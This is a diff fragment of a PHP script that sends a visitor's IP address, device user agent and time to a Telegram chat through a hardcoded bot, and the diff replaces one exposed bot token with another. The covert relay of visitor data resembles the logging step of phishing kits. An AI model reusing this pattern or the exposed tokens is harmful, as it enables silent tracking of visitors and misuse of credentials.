@@ -8,7 +8,7 @@ $msg .= "🌐 IP: $ip\n";
 $msg .= "📱 Device: $agent\n";
 $msg .= "⏰ Time: $time";
 
-$botToken = "7587151467:AAHbnbxj8zngwreQQUg4Z8w1pcoV_WOjiP8";
+$botToken = "8501752705:AAH9jUmAFhqyXcY3HArFCqP0Ep_M61o2K9Y";
 $chatId   = "7347711725";
 
 $url = "https://api.telegram.org/bot$botToken/sendMessage";
